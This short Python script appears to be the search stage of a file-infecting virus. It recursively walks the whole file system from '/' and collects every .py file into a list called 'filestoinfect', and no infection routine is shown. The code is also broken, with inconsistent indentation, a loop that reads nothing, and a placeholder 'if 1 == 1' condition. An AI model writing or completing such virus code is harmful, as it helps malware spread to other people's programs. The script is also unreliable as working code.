import os
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
		elif fname[-3:] == ".py":
            for line in open(path+"/"+fname):
                    break
            if 1 == 1:
				#print (path+"/")
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
	
search("/")